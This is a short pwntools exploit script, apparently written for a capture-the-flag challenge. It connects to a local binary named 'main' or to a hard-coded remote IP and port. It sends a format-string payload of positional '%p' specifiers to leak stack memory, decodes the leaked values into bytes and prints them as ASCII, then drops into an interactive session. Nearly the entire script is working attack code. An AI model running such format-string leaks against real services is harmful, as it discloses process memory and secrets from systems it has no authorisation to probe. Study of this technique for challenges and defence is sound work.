#!/usr/bin/env python3

from pwn import *

exe = ELF('main', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
context.binary = exe
context.terminal = [ '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '--size', '0.6', '-d', '.', 'wsl.exe','-d', 'Parrot', 'bash', '-c' ]

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        b*0x40129b

        c
        ''')
        input()

if args.REMOTE:
    p = remote('136.115.87.65', 31779)
elif args.DOCKER:
    p = remote('')
else:
    p = process([exe.path])
    
GDB()

payload = " ".join(f"%{i}$p " for i in range(0x8 + 6, 0x10 + 6))
s(payload.encode())

line = p.recvline()
leaks = re.findall(rb"0x[0-9a-fA-F]+", line)
decoded = b""
for leak in leaks:
    value = int(leak, 16)
    decoded += p64(value)

print(f"[+] Decoded: {decoded!r}")
print("[+] ASCII:   ", end="")
print("".join(chr(x) if 32 <= x <= 126 else "." for x in decoded))

p.interactive()
